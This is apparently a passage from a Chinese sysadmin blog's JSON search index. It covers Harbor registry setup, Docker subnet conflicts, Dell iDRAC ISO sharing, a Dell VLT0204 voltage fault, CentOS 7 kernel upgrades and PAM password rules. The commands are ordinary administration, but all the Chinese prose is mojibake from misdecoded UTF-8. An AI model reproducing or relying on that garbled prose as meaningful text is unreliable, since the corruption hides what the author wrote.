/your/private/key/path\rç„¶åç›´æ¥å®‰è£…ï¼š\n./install.sh\rå®‰è£…å®Œæˆäº†å°±ï¼Œçœ‹ä¸€çœ¼ï¼š\ndocker-compose ps\rç„¶åç›´æ¥ç™»å½• http://172.18.31.28 å°±å¥½\nç¼ºçœæœ‰ä¸€ä¸ªlibraryçš„å¼€æ”¾é¡¹ç›®ï¼Œæˆ‘ä»¬æ¨ä¸€ä¸ªbusyboxè¿‡å»æµ‹è¯•ä¸€ä¸‹ï¼š\né¦–å…ˆæ‹‰ä¸€ä¸ªbusyboxåˆ°æœ¬åœ°\rdocker pull busybox\ræ‰“ä¸ªtag\rdocker tag busybox:latest 172.18.31.28/library/busybox\ræ¨ä¸Šå»\rdocker push 172.18.31.28/library/busybox\rè¿™æ—¶å€™å†å»31.28çš„libraryé¡¹ç›®é‡Œçœ‹ï¼Œå°±èƒ½çœ‹åˆ°æ–°æ¨ä¸Šå»çš„busyboxé•œåƒäº†\nåœ¨å…¶ä»–çš„æœºå™¨ä¸Šï¼Œé¦–å…ˆç™»å½•ï¼Œç„¶åå°±å¯ä»¥æ‹‰é•œåƒäº†ã€‚ å†ä¸¾ä¸ªå®é™…ä¾‹å­ï¼Œæˆ‘ä»¬æŠŠmetallbç»™æ¨ä¸Šå»å¤‡ç”¨ï¼š\næ‰“tag\rdocker tag docker.io/metallb/controller:v0.9.3 172.18.31.28/library/docker.io/metallb/controller:v0.9.3\ræ¨ä¸Šå»\rdocker push 172.18.31.28/library/docker.io/metallb/controller:v0.9.3\r","permalink":"https://rendoumi.com/posts/20221219-docker_harbor/","summary":"\u003cp\u003eä¸€ï¼šæˆ‘ä»¬åœ¨å…¬å¸å†…éƒ¨å»ºç«‹äº†Dockerå†…éƒ¨é•œåƒä»“åº“ï¼š\u003c/p\u003e\n\u003cp\u003eharboræ˜¯vmwareå‡ºçš„ä¸€ä¸ªdockeré•œåƒä»“åº“ï¼Œæœ¬è´¨æ˜¯ä¸€ç»„å®¹å™¨çš„é›†åˆä½“ï¼Œç®—æ˜¯ä¸€ä¸ªå¤šå®¹å™¨çš„pod.\u003c/p\u003e\n\u003cp\u003eæ•°æ®å·ç¼ºçœæ˜¯å®¿ä¸»æœºçš„/dataï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠiscsiuæŒ‚åœ¨/data\u003c/p\u003e\n\u003cp\u003eä¸»æœºï¼š172.18.31.28\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆå®‰è£…docker-ce\u003c/p\u003e\n\u003cp\u003eæ·»åŠ docker-ceæºï¼š\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eyum install epel-release\r\n\r\nyum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo\r\n\r\nyum install docker-ce -y\r\n\r\nyum install ntp -y\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eå¯åŠ¨è‡ªåŠ¨åŒæ­¥æ—¶é—´:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003etimedatectl set-ntp yes  #æ­¤å¤„å¯ç”¨yes,no,1æˆ–0\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eé…ç½®æ—¶åŒº:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003etimedatectl set-timezone Asia/Shanghai\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eé…ç½®Dockerå¯åŠ¨å‚æ•°ï¼š\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003emkdir -p /etc/docker\r\ncat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /etc/docker/daemon.json\r\n{\r\n    \u0026quot;registry-mirrors\u0026quot;: [\u0026quot;https://docker.mirrors.ustc.edu.cn/\u0026quot;]\r\n}\r\nEOF\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eä¹‹åè£…çš„æ‰€æœ‰Dockerçš„å®¿ä¸»æœºï¼Œå¦‚æœè¦ç”¨åˆ°è¿™ä¸ªç§æœ‰ä»“åº“çš„è¯ï¼š\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003ecat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /etc/docker/daemon.json\r\n{\r\n     \u0026quot;insecure-registries\u0026quot;:[\u0026quot;172.18.31.28\u0026quot;],\r\n     \u0026quot;registry-mirrors\u0026quot;: [\u0026quot;https://docker.mirrors.ustc.edu.cn/\u0026quot;]\r\n}\r\nEOF\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eå¯åŠ¨docker\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003esystemctl enable docker \u0026amp;\u0026amp; systemctl start docker\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eâ€‹\nå®‰è£…Docker-compose\u003c/p\u003e","title":"dockeré•œåƒä»“åº“harborçš„æ­å»ºä¸ä½¿ç”¨"},{"content":"dockeré»˜è®¤ç½‘æ®µæ˜¯172.17ï¼Œå’Œå…¬å¸çš„ç½‘æ®µ172.16å’Œ172.18æœ‰æ—¶å€™ä¼šå†²çªï¼Œè§£å†³æ–¹æ³•å°±æ˜¯æ¢dockerç½‘æ®µã€‚\næ–¹æ¡ˆï¼šä¸æ”¹dockerç½‘æ®µï¼Œåˆ›å»ºä¸å’Œå…¬å¸ç½‘æ®µå†²çªçš„dockerå­ç½‘æ®µ\ndocker network create --driver=bridge --subnet=172.19.0.0/24 monitor_net è¿è¡Œå®¹å™¨æ—¶æŒ‡å®š\ndocker run -it --name \u0026lt;å®¹å™¨å\u0026gt; ---network monitor_net \u0026lt;é•œåƒå\u0026gt; åœ¨docker-composeåŒæ ·é€šè¿‡networksæŒ‡å®šï¼Œå½¢å¼å¦‚ä¸‹ï¼š\nversion: \u0026#39;3\u0026#39; networks: monitor: #ä½¿ç”¨å·²ç»å­˜åœ¨çš„ç½‘ç»œ external: name: monitor_net services: prometheus: image: prom/prometheus container_name: prometheus hostname: prometheus privileged: true restart: always volumes: - /usr/local/src/config/prometheus.yml:/etc/prometheus/prometheus.yml - /usr/local/src/config/node_down.yml:/etc/prometheus/node_down.yml ports: - \u0026#34;9091:9090\u0026#34; networks: - monitor links: - alertmanager - node-exporter ","permalink":"https://rendoumi.com/posts/20221219-docker_network/","summary":"\u003cp\u003edockeré»˜è®¤ç½‘æ®µæ˜¯172.17ï¼Œå’Œå…¬å¸çš„ç½‘æ®µ172.16å’Œ172.18æœ‰æ—¶å€™ä¼šå†²çªï¼Œè§£å†³æ–¹æ³•å°±æ˜¯æ¢dockerç½‘æ®µã€‚\u003c/p\u003e\n\u003cp\u003eæ–¹æ¡ˆï¼šä¸æ”¹dockerç½‘æ®µï¼Œåˆ›å»ºä¸å’Œå…¬å¸ç½‘æ®µå†²çªçš„dockerå­ç½‘æ®µ\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker network create --driver\u003cspan class=\"o\"\u003e=\u003c/span\u003ebridge --subnet\u003cspan class=\"o\"\u003e=\u003c/span\u003e172.19.0.0/24 monitor_net\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿è¡Œå®¹å™¨æ—¶æŒ‡å®š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker run -it --name \u0026lt;å®¹å™¨å\u0026gt; ---network monitor_net \u0026lt;é•œåƒå\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eåœ¨docker-composeåŒæ ·é€šè¿‡networksæŒ‡å®šï¼Œå½¢å¼å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eversion: \u003cspan class=\"s1\"\u003e\u0026#39;3\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetworks:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   monitor:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   \u003cspan class=\"c1\"\u003e#ä½¿ç”¨å·²ç»å­˜åœ¨çš„ç½‘ç»œ\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e     external:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e       name: monitor_net  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eservices:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    prometheus:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        image: prom/prometheus\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        container_name: prometheus\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        hostname: prometheus\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        privileged: \u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        restart: always\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        volumes:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            - /usr/local/src/config/prometheus.yml:/etc/prometheus/prometheus.yml\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            - /usr/local/src/config/node_down.yml:/etc/prometheus/node_down.yml\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ports:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            - \u003cspan class=\"s2\"\u003e\u0026#34;9091:9090\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        networks:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            - monitor\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        links:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            - alertmanager\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            - node-exporter\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"Dockerçš„ç¼ºçœç½‘æ®µå†²çªé—®é¢˜"},{"content":"DellæœåŠ¡å™¨è®¾ç½®è¿œç¨‹æ–‡ä»¶å…±äº«\nç”¨æ¥åŠ è½½isoæ–‡ä»¶ï¼Œç”¨äºå®‰è£…ç³»ç»Ÿæˆ–è€…ä¿®å¤\nè¾“å…¥172.18.31.2:/export/nfsshare/centos7-live-docker.iso\nç¼ºçœæ˜¯æ”¯æŒ4ç§æ ¼å¼çš„å…±äº«ï¼š\nCIFS â€” //\u0026lt;IP to connect for CIFS file system\u0026gt;/\u0026lt;file path\u0026gt;/\u0026lt;image name\u0026gt;\rNFS â€” \u0026lt; IP to connect for NFS file system\u0026gt;:/\u0026lt;file path\u0026gt;/\u0026lt;image name\u0026gt;\rHTTP â€” http://\u0026lt;URL\u0026gt;/\u0026lt;file path\u0026gt;/\u0026lt;image name\u0026gt;\rHTTPs â€” https://\u0026lt;URL\u0026gt;/\u0026lt;file path\u0026gt;/\u0026lt;image name\u0026gt; ç‚¹å‡»Connect å¥½çš„è¯ï¼Œå°±ä¼šè¹¦å‡ºSuccess ç„¶åå¯åŠ¨è™šæ‹Ÿæ§åˆ¶å°ï¼ŒBootèœå•é€‰ä¸­å¯åŠ¨ï¼šVirtual CD/DVD/ISO é‡å¯ï¼Œå°±å¯ä»¥è¿›å…¥centos7-live-docker.isoçš„ç³»ç»Ÿäº†\n","permalink":"https://rendoumi.com/posts/20221218-dell_idrac_remote_share/","summary":"\u003cp\u003eDellæœåŠ¡å™¨è®¾ç½®è¿œç¨‹æ–‡ä»¶å…±äº«\u003c/p\u003e\n\u003cp\u003eç”¨æ¥åŠ è½½isoæ–‡ä»¶ï¼Œç”¨äºå®‰è£…ç³»ç»Ÿæˆ–è€…ä¿®å¤\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20221218-dell_idrac_remote_share/2021-10-09_110107.png\"\u003e\u003c/p\u003e\n\u003cp\u003eè¾“å…¥172.18.31.2:/export/nfsshare/centos7-live-docker.iso\u003c/p\u003e\n\u003cp\u003eç¼ºçœæ˜¯æ”¯æŒ4ç§æ ¼å¼çš„å…±äº«ï¼š\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e    CIFS â€” //\u0026lt;IP to connect for CIFS file system\u0026gt;/\u0026lt;file path\u0026gt;/\u0026lt;image name\u0026gt;\r\n    NFS â€” \u0026lt; IP to connect for NFS file system\u0026gt;:/\u0026lt;file path\u0026gt;/\u0026lt;image name\u0026gt;\r\n    HTTP â€” http://\u0026lt;URL\u0026gt;/\u0026lt;file path\u0026gt;/\u0026lt;image name\u0026gt;\r\n    HTTPs â€” https://\u0026lt;URL\u0026gt;/\u0026lt;file path\u0026gt;/\u0026lt;image name\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eç‚¹å‡»Connect\n\u003cimg loading=\"lazy\" src=\"/posts/20221218-dell_idrac_remote_share/2021-10-09_105140.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå¥½çš„è¯ï¼Œå°±ä¼šè¹¦å‡ºSuccess\n\u003cimg loading=\"lazy\" src=\"/posts/20221218-dell_idrac_remote_share/2021-10-09_105201.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç„¶åå¯åŠ¨è™šæ‹Ÿæ§åˆ¶å°ï¼ŒBootèœå•é€‰ä¸­å¯åŠ¨ï¼šVirtual CD/DVD/ISO\n\u003cimg loading=\"lazy\" src=\"/posts/20221218-dell_idrac_remote_share/2021-10-09_111519.png\"\u003e\u003c/p\u003e\n\u003cp\u003eé‡å¯ï¼Œå°±å¯ä»¥è¿›å…¥centos7-live-docker.isoçš„ç³»ç»Ÿäº†\u003c/p\u003e","title":"DellæœåŠ¡å™¨è®¾ç½®è¿œç¨‹æ–‡ä»¶å…±äº«"},{"content":"vlt0204, NDCç“¦ç‰¹è¶…äº†ï¼Œåæœ‰å…«ä¹æ˜¯ç½‘å¡çƒ§äº†ï¼Œç„¶åå¯¼è‡´ä¸»æ¿ç”µå‹è¿‡è½½ã€‚\nå‰é¢æ¿æ—¥å¿—ï¼šVLT0204ï¼Œç™»å½•idracçœ‹åˆ°æ—¥å¿—ï¼š\nThe system board NDC PG voltage is outside of range.\ræ‚²å‰§äº†ï¼Œå¯èƒ½æ˜¯ä¸»æ¿çƒ§äº†\nå¤„ç†æ–¹æ³•å¦‚ä¸‹ï¼š\nä¸€ã€ä¸»æ¿æ”¾ç”µ\n1ã€å…³æœº 2ã€æ‹”ç”µæºçº¿ 3ã€é•¿æŒ‰ç”µæºå¼€å…³åŠåˆ†é’Ÿä¸æ”¾æ‰‹ 4ã€åŠåˆ†é’Ÿåæ”¾æ‰‹ï¼Œæ¥å›ç”µæºçº¿å¼€æœºçœ‹çœ‹\nå¦‚æœä»¥ä¸Šæ–¹æ³•ä¸è¡Œï¼Œå°±å¿…é¡»é‡‡ç”¨ç¬¬äºŒç§æ–¹æ³•ï¼š\näºŒã€æœ€å°åŒ–è´Ÿè½½æ’é”™\n1ã€æ‹”æ‰ç”µæº2 2ã€æ‹”æ‰CPU2 3ã€æ‹”æ‰æ‰€æœ‰å†…å­˜ï¼ˆåªç•™1æ¡æˆ–2æ¡ï¼‰ 4ã€æ‹”æ‰ç½‘å¡ 5ã€å¯åŠ¨çœ‹çœ‹\nR740çš„å†…å­˜æ’æ³•ï¼š\nR730çš„å†…å­˜æ’æ³•ï¼š\n","permalink":"https://rendoumi.com/posts/20221218-dell_memory/","summary":"\u003cp\u003evlt0204, NDCç“¦ç‰¹è¶…äº†ï¼Œåæœ‰å…«ä¹æ˜¯ç½‘å¡çƒ§äº†ï¼Œç„¶åå¯¼è‡´ä¸»æ¿ç”µå‹è¿‡è½½ã€‚\u003c/p\u003e\n\u003cp\u003eå‰é¢æ¿æ—¥å¿—ï¼šVLT0204ï¼Œç™»å½•idracçœ‹åˆ°æ—¥å¿—ï¼š\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eThe system board NDC PG voltage is outside of range.\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20221218-dell_memory/2020-09-15_171556.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæ‚²å‰§äº†ï¼Œå¯èƒ½æ˜¯ä¸»æ¿çƒ§äº†\u003c/p\u003e\n\u003cp\u003eå¤„ç†æ–¹æ³•å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cp\u003eä¸€ã€ä¸»æ¿æ”¾ç”µ\u003c/p\u003e\n\u003cp\u003e1ã€å…³æœº\n2ã€æ‹”ç”µæºçº¿\n3ã€é•¿æŒ‰ç”µæºå¼€å…³åŠåˆ†é’Ÿä¸æ”¾æ‰‹\n4ã€åŠåˆ†é’Ÿåæ”¾æ‰‹ï¼Œæ¥å›ç”µæºçº¿å¼€æœºçœ‹çœ‹\u003c/p\u003e\n\u003cp\u003eå¦‚æœä»¥ä¸Šæ–¹æ³•ä¸è¡Œï¼Œå°±å¿…é¡»é‡‡ç”¨ç¬¬äºŒç§æ–¹æ³•ï¼š\u003c/p\u003e\n\u003cp\u003eäºŒã€æœ€å°åŒ–è´Ÿè½½æ’é”™\u003c/p\u003e\n\u003cp\u003e1ã€æ‹”æ‰ç”µæº2\n2ã€æ‹”æ‰CPU2\n3ã€æ‹”æ‰æ‰€æœ‰å†…å­˜ï¼ˆåªç•™1æ¡æˆ–2æ¡ï¼‰\n4ã€æ‹”æ‰ç½‘å¡\n5ã€å¯åŠ¨çœ‹çœ‹\u003c/p\u003e\n\u003cp\u003eR740çš„å†…å­˜æ’æ³•ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20221218-dell_memory/2020-09-15_171736.png\"\u003e\u003c/p\u003e\n\u003cp\u003eR730çš„å†…å­˜æ’æ³•ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20221218-dell_memory/2020-09-15_171835.png\"\u003e\u003c/p\u003e","title":"Dellæœºå™¨ä¸»æ¿VLT0204æ•…éšœå¤„ç†ä»¥åŠå†…å­˜æ’æ³•"},{"content":"CentOS7æ›´æ–°å†…æ ¸ å†…æ ¸ä¸‹è½½åœ°å€ï¼šhttps://elrepo.org/linux/kernel/el7/x86_64/RPMS/\nå†…æ ¸åŒ…æœ‰ä¸¤ç§ï¼Œmlä¸»æµï¼Œlté•¿æœŸæ”¯æŒã€‚\næˆ‘ä»¬å‡çº§æ ¸å¿ƒè‚¯å®šæ˜¯ä¸ºäº†ä¸»æµçš„åŠŸèƒ½ï¼Œltè¿˜å‡å®ƒåšç”šã€‚\n#å‡çº§ï¼š\nrpm -ivh https://elrepo.org/linux/kernel/el7/x86_64/RPMS/kernel-ml-6.1.0-1.el7.elrepo.x86_64.rpm #æŸ¥çœ‹å¯ç”¨å†…æ ¸\nawk -F\\\u0026#39; \u0026#39;$1==\u0026#34;menuentry \u0026#34; {print i++ \u0026#34; : \u0026#34; $2}\u0026#39; /etc/grub2.cfg #åˆå§‹åŒ–ç¬¬ä¸€ä¸ªä¸ºé»˜è®¤å†…æ ¸\ngrub2-set-default 0 #é‡æ–°åˆ›å»ºå†…æ ¸é…ç½®\ngrub2-mkconfig -o /boot/grub2/grub.cfg reboot #åç»­æœ‰éœ€è¦å†è£…ï¼Œä¸éœ€è¦æå¼€å‘å°±åˆ«è£…ï¼\n#æ›´æ–°kernel-ml-headers rpm -ivh https://elrepo.org/linux/kernel/el7/x86_64/RPMS/kernel-ml-headers-6.1.0-1.el7.elrepo.x86_64.rpm #æ›´æ–°kernel-ml-devel rpm -ivh https://elrepo.org/linux/kernel/el7/x86_64/RPMS/kernel-ml-devel-6.1.0-1.el7.elrepo.x86_64.rpm ","permalink":"https://rendoumi.com/posts/20221218-centos7_upgrade_kernel/","summary":"\u003ch2 id=\"centos7æ›´æ–°å†…æ ¸\"\u003eCentOS7æ›´æ–°å†…æ ¸\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eå†…æ ¸ä¸‹è½½åœ°å€ï¼šhttps://elrepo.org/linux/kernel/el7/x86_64/RPMS/\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003eå†…æ ¸åŒ…æœ‰ä¸¤ç§ï¼Œmlä¸»æµï¼Œlté•¿æœŸæ”¯æŒã€‚\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬å‡çº§æ ¸å¿ƒè‚¯å®šæ˜¯ä¸ºäº†ä¸»æµçš„åŠŸèƒ½ï¼Œltè¿˜å‡å®ƒåšç”šã€‚\u003c/p\u003e\n\u003cp\u003e#å‡çº§ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003erpm -ivh https://elrepo.org/linux/kernel/el7/x86_64/RPMS/kernel-ml-6.1.0-1.el7.elrepo.x86_64.rpm\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e#æŸ¥çœ‹å¯ç”¨å†…æ ¸\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eawk -F\u003cspan class=\"se\"\u003e\\\u0026#39;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;$1==\u0026#34;menuentry \u0026#34; {print i++ \u0026#34; : \u0026#34; $2}\u0026#39;\u003c/span\u003e /etc/grub2.cfg\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e#åˆå§‹åŒ–ç¬¬ä¸€ä¸ªä¸ºé»˜è®¤å†…æ ¸\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrub2-set-default \u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e#é‡æ–°åˆ›å»ºå†…æ ¸é…ç½®\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrub2-mkconfig -o /boot/grub2/grub.cfg\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ereboot\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e#åç»­æœ‰éœ€è¦å†è£…ï¼Œä¸éœ€è¦æå¼€å‘å°±åˆ«è£…ï¼\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#æ›´æ–°kernel-ml-headers\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003erpm -ivh https://elrepo.org/linux/kernel/el7/x86_64/RPMS/kernel-ml-headers-6.1.0-1.el7.elrepo.x86_64.rpm\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#æ›´æ–°kernel-ml-devel\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003erpm -ivh https://elrepo.org/linux/kernel/el7/x86_64/RPMS/kernel-ml-devel-6.1.0-1.el7.elrepo.x86_64.rpm\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"å‡çº§CentOS7çš„kernelæ ¸å¿ƒ"},{"content":"å„ç§åˆè§„è¦æ±‚ä¸­éƒ½å¯¹ç”¨æˆ·ç­–ç•¥æœ‰ç€è¦æ±‚ï¼Œä»€ä¹ˆPCIå•Šï¼Œä¸Šå¸‚å®¡è®¡å•Šï¼Œéƒ½æœ‰ç€å¯†ç å¤æ‚ç¨‹åº¦çš„è¦æ±‚ï¼š\nCentOS 7 çš„ç”¨æˆ·å¯†ç ç­–ç•¥ï¼š\nä¿®æ”¹vi /etc/pam.d/system-auth\nå…¶ä¸­æœ‰ä¸€è¡Œï¼š\npassword requisite pam_pwquality.so try_first_pass local_users_only retry=3 authtok_type= åé¢åŠ ä¸Šï¼š\nminlen=12 lcredit=-1 ucredit=-1 dcredit=-1 ocredit=-1 enforce_for_root ä¿®æ”¹æˆä¸ºï¼š\npassword requisite pam_pwquality.so try_first_pass local_users_only retry=3 authtok_type= minlen=12 lcredit=-1 ucredit=-1 dcredit=-1 ocredit=-1 enforce_for_root æ„æ€æ˜¯ï¼š\nå¯†ç é•¿åº¦12ï¼Œé¡»åŒ…å«ï¼šä¸€ä¸ªå°å†™å­—ç¬¦ï¼Œä¸€ä¸ªå¤§å†™å­—ç¬¦ï¼Œä¸€ä¸ªæ•°å­—ï¼Œä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ï¼Œå¼ºåˆ¶rootä¹Ÿéµå®ˆæ­¤è§„åˆ™ å‚æ•°å…¨éƒ¨è§£é‡Šå¦‚ä¸‹ï¼š\nretry=3: This option will prompt the user 3 times before exiting and returning an error. minlen=12: This specifies that the password cannot be less than 12 characters. maxrepeat=3: This allows implies that only a maximum of 3 repeated characters can be included in the password. ucredit=-1: The option requires at least one uppercase character in the password. lcredit=-1: The option requires at least one lowercase character in the password. dcredit=-1: This implies that the password should have at last a numeric character. ocredit=-1: The option requires at least one special character included in the password. difok=3: This implies that only a maximum of 3 character changes in the new password should be present in the old password. reject_username: The option rejects a password if it consists of the username either in its normal way or in reverse. enforce_for_root: This ensures that the password policies are adhered to even if itâ€™s the root user configuring the passwords. ","permalink":"https://rendoumi.com/posts/20221218-centos7_passwd/","summary":"\u003cp\u003eå„ç§åˆè§„è¦æ±‚ä¸­éƒ½å¯¹ç”¨æˆ·ç­–ç•¥æœ‰ç€è¦æ±‚ï¼Œä»€ä¹ˆPCIå•Šï¼Œä¸Šå¸‚å®¡è®¡å•Šï¼Œéƒ½æœ‰ç€å¯†ç å¤æ‚ç¨‹åº¦çš„è¦æ±‚ï¼š\u003c/p\u003e\n\u003cp\u003eCentOS 7 çš„ç”¨æˆ·å¯†ç ç­–ç•¥ï¼š\u003c/p\u003e\n\u003cp\u003eä¿®æ”¹vi /etc/pam.d/system-auth\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20221218-centos7_passwd/2021-01-28_104150.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå…¶ä¸­æœ‰ä¸€è¡Œï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epassword    requisite     pam_pwquality.so try_first_pass local_users_only \u003cspan class=\"nv\"\u003eretry\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e3\u003c/span\u003e \u003cspan 